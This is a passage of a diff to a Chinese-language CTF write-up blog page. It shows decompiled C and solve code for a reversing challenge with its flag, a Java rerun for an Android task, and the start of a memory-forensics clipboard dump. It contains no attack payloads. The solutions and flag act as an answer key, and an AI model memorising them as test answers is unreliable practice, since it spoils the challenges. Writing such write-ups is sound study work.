+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax
@@ -383,9 +667,111 @@
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="nf">getchar</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>其中<code>xor</code>, <code>or</code>和<code>and</code>涉及到一点模电的知识, 很好识别.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>xor</code>, <code>or</code>和<code>and</code>涉及到一点模电的知识, 很好识别.</p>
 <p>常量数组带入后再次简化的程序:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">or_utils</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="o">~</span><span class="n">a</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">b</span><span class="p">;</span> <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
@@ -480,9 +866,61 @@
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"> <span class="nf">getchar</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>这个程序和题目的作用相同.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个程序和题目的作用相同.</p>
 <p>稍微改一下, 编写解题程序:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -528,7 +966,9 @@
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//flag is: MiniMCTF{Wh@t_iS_virti@liz@tiOn}
-</span></span></span></code></pre></div><p>复制下来改改就好了.</p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>复制下来改改就好了.</p>
 <p>最后的输出中<code>MiniL</code>变成了<code>MiniM</code>, 手动改过来就是正确flag了.</p>
 <h2 class="heading-element" id="安卓"><span>安卓</span>
  <a href="#%e5%ae%89%e5%8d%93" class="heading-mark">
@@ -539,7 +979,101 @@
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>用<code>dex2jar</code>导出为jar之后拖入到<code>jd-gui</code>, 发现就是个简单的算法题. 不过查了好久也没查到<code>Java</code>中的<code>SHA</code>代指SHA几, 最后索性直接复制下来跑出答案.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.charset.StandardCharsets</span><span class="p">;</span><span class="w">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.charset.StandardCharsets</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.MessageDigest</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
@@ -628,7 +1162,9 @@
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">J</span><span class="p">());</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div><h2 class="heading-element" id="misc-1"><span>Misc</span>
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="misc-1"><span>Misc</span>
  <a href="#misc-1" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
@@ -638,11 +1174,61 @@
  </a>
 </h3><p>这道题是由我和<a href="https://luoq1an.github.io"target="_blank" rel="external nofollow noopener noreferrer"><code>luoqi@n</code></a>共同完成的.</p>
 <p>首先要从Vmem中提取出剪贴板数据, 导出了一个巨大的txt:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">10</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">11</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">12</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">13</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">14</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">15</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">16</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">17</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">18</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">19</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">20</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">22</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">23</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">24</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">25</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">26</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">27</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">28</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">29</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">30</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">31</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">33</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">34</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">35</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">36</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">37</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">38</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">39</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">40</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">41</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">42</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">44</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">45</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">46</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">47</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">48</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">49</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">50</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">51</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">52</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">53</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">55</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">56</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">57</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">58</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">59</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">60</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">61</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">62</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">63</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">64</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">65</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">66</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">67</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">68</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">69</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">70</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">71</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">72</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">73</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">74</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">75</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">76</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">78</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">79</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">80</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">81</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">82</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">83</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">84</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">85</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">86</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">87</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">100</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">101</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">102</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">103</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">104</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">105</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">106</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">107</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">108</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">109</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">111</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">112</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">113</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">114</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">115</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">116</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">117</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">118</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">119</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">120</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">121</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">134</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">135</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">136</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">137</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">138</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">139</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">140</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">141</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">142</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">143</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">145</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">146</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">147</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">148</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">149</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">150</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">151</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">152</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">153</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">154</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">156</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">157</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">158</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">159</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">160</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">161</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">162</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">163</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">164</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">165</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">190</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">191</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">192</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">193</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">194</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">195</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">196</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">197</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">198</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">199</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">212</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">213</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">214</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">215</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">216</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">217</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">218</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">219</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">220</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">221</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">223</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">224</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">225</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">226</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">227</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">228</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">229</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">230</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">231</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">232</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">233</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">234</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">235</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">236</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">237</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">238</span> <span class="n">s3cR3t</span><span class="p">:</span><span class="mi">10</span> <span class="mi">239</span> <span class="n">s3cR3t</span><span class="p">:</span><span 